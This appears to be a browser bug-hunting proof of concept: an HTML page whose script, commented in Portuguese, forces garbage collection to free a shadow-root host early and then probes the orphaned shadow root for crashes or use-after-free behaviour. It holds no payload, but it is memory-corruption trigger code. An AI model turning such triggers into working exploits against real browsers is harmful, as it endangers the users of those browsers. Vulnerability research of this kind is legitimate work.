<pre id="log"></pre>
<script>
function log(msg) {
    document.getElementById('log').textContent += msg + '\n';
    console.log(msg);
}

// GC simples — sem recursão exponencial
function gc() {
    var arr = [];
    for (var i = 0; i < 50000; i++) arr.push({});
    arr = null;
    // Segunda rodada com TypedArrays para pressão de heap
    for (var i = 0; i < 200; i++) new Uint8Array(4096);
}

var capturedShadowRoot = null;
var capturedInnerChild  = null;

// Host NUNCA armazenado em variável JS persistente
// O único acesso a 'this' é dentro do callback — sai de scope ao retornar
customElements.define('x-gc-host', class extends HTMLElement {
    connectedCallback() {
        // 'this' existe só na stack deste callback
        // attachShadow NÃO cria wrapper persistente para 'this'
        var sr = this.attachShadow({ mode: 'open' });
        capturedInnerChild = document.createElement('span');
        sr.appendChild(capturedInnerChild);
        capturedShadowRoot = sr;
        // 'this' sai de scope aqui → wrapper elegível para GC
        // host.hasChildNodes() == false (zero filhos no light DOM)
    }
});

function buildOrphanedRoot() {
    var container = document.createElement('div');
    document.body.appendChild(container);

    // innerHTML cria x-gc-host sem variável JS persistente do host
    container.innerHTML = '<x-gc-host></x-gc-host>';

    var sr    = capturedShadowRoot;
    var child = capturedInnerChild;
    capturedShadowRoot  = null;
    capturedInnerChild  = null;

    // Remove host do DOM:
    //   host.wrapper()       → pode ser null (wrapper do callback já saiu de scope)
    //   host.hasChildNodes() → false (sem light DOM children)
    //   → willCreatePossiblyOrphanedTreeByRemoval NÃO cria wrapper
    //   → host elegível para GC
    container.remove();

    return { sr: sr, child: child };
}

var o = buildOrphanedRoot();
var orphanedRoot = o.sr;
var innerChild   = o.child;

// Dois passes de GC com delay para garantir coleta
gc();
setTimeout(function() {
    gc();
    setTimeout(function() {
        log('=== Resultado pós-GC ===');
        var host = orphanedRoot.host;
        log('host: ' + host);
        log('host === null: ' + (host === null));

        if (host === null) {
            log('[BUG CONFIRMADO] Host coletado prematuramente pelo GC');
            log('');
            log('--- Probe: operações que acessam m_host internamente ---');

            // 1. getRootNode no filho — traversal via shadow root → m_host (null/freed)
            try {
                var r = innerChild.getRootNode({ composed: true });
                log('getRootNode(composed): ' + r + ' (esperado: host, foi: ' + 
                    (r === orphanedRoot ? 'shadowRoot' : r) + ')');
            } catch(e) { log('getRootNode CRASH/EXCECAO: ' + e); }

            // 2. getComputedStyle — style resolver pode percorrer shadow boundary → host
            try {
                var s = window.getComputedStyle(innerChild).display;
                log('getComputedStyle.display: ' + s);
            } catch(e) { log('getComputedStyle CRASH/EXCECAO: ' + e); }

            // 3. Layout — pode acessar shadowHost() para calcular offsetParent
            try {
                var op = innerChild.offsetParent;
                log('offsetParent: ' + op);
            } catch(e) { log('offsetParent CRASH/EXCECAO: ' + e); }

            // 4. getBoundingClientRect — renderer pode percorrer até host
            try {
                var rect = innerChild.getBoundingClientRect();
                log('getBoundingClientRect: ' + JSON.stringify(rect));
            } catch(e) { log('getBoundingClientRect CRASH/EXCECAO: ' + e); }

            // 5. Inserir node no SR órfão — pode triggerar path que usa host
            try {
                var d = document.createElement('div');
                orphanedRoot.appendChild(d);
                log('appendChild ao SR órfão: OK');
                d.remove();
                log('remove do SR órfão: OK');
            } catch(e) { log('appendChild CRASH/EXCECAO: ' + e); }

            // 6. Mover filho do SR órfão para document
            try {
                document.body.appendChild(innerChild);
                log('mover innerChild para body: OK');
            } catch(e) { log('mover innerChild CRASH/EXCECAO: ' + e); }

        } else {
            log('[Host sobreviveu] wrapper ainda existia — aumentar pressão de GC');
        }

        log('TEST COMPLETE');
    }, 200);
}, 200);
</script>
